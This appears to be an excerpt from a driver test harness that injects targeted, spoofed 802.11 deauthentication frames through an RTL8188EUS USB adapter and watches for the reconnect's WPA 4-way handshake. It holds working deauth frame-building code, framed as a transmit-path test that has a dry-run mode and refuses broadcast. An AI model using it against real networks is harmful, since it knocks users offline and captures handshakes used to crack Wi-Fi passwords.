"""RTL8188EUS (vendor/DKMS port) — live targeted-deauth injection harness (M13 TX).

Drives the DKMS driver DIRECTLY (like ``scan_hw.py``), bypassing the device manager (master
keeps the mainline-derived ``rtl8188eus`` as the default for 2357:010c). Brings the card up,
tunes to the target AP's channel, and injects a burst of the classic bidirectional deauth
(spoof-AP -> client and spoof-client -> AP) via ``driver.inject_frame`` — the M13 TX path
(``tx.build_mgmt_txdesc`` + bulk-OUT). This is the live gate for TX: does the card actually
emit a deauth that drops a client, and do we then capture the reconnect's 4-way handshake.

TARGETED ONLY — ``--client`` must be a specific unicast STA. Broadcast/multicast is refused
on purpose: a broadcast deauth would knock every station on the BSSID off, including this dev
machine if it shares the AP. Pick a client that is NOT this machine.

Usage (card plugged in + Zadig/WinUSB-bound to 2357:010c):
    # SAFE preview — brings up + tunes + builds frames, transmits NOTHING:
    uv run python scripts/rtl8188eus_dkms/deauth_hw.py \\
...
def _build_deauth_frames(ap_mac: bytes, cl_mac: bytes) -> tuple[bytes, bytes]:
    """The two targeted deauth frames. FC=0xC0 (deauth/mgmt), reason 7 (class-3 frame from
    nonassociated STA), HW fills the sequence. Both are unicast (addr1 = a real STA/AP)."""
    fc_dur = b"\xc0\x00\x00\x00"
    seq = b"\x00\x00"
    reason = struct.pack("<H", 7)
    client_deauth = fc_dur + cl_mac + ap_mac + ap_mac + seq + reason   # spoof AP -> client
    ap_deauth = fc_dur + ap_mac + cl_mac + ap_mac + seq + reason       # spoof client -> AP
    return client_deauth, ap_deauth


class _HandshakeTally:
    """Driver rx callback: watch for the deauth's effect — target-AP beacons (on-channel),
    target-client frames, and EAPOL (the reconnect 4-way handshake = the deauth worked)."""
...
def main() -> int:
    ap = argparse.ArgumentParser(description="RTL8188EUS DKMS targeted-deauth harness (M13)")
